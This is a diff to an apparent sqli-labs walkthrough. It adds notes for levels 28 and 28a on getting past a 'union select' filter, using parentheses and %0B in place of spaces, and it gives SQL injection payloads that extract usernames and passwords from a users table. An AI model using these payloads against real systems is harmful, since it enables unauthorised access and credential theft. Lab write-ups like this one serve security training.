@@ -272,9 +272,24 @@ less-28
 =======
 
 
-In this less we by pass ``union select`` filter
+In this less we by pass ``union select`` filter ,the filter will match if there is ``union[space]select`` and removes it
+but we can bypass that by using `(` between union and select ,we can see that there is parathesis at the backend so it will complete our payload
  
  payload ``?id=') union(select (1),group_concat(username),('3') from%0Busers%0Bwhere '1``
 
 ![image](https://user-images.githubusercontent.com/61080375/116455339-93908600-a87e-11eb-936f-5ba25fd98769.png)
+
+
+less-28a
+========
+
+
+It has same fiters as level-28 we can also bypass this by using ``(``
+
+payload``') union(select (1),group_concat(username),group_concat(password) from%0Busers%0Bwhere '1``
+
+
+
+![image](https://user-images.githubusercontent.com/61080375/116713856-cf4c5c80-a9f2-11eb-8eb2-7023c2e51e5f.png)
+
 
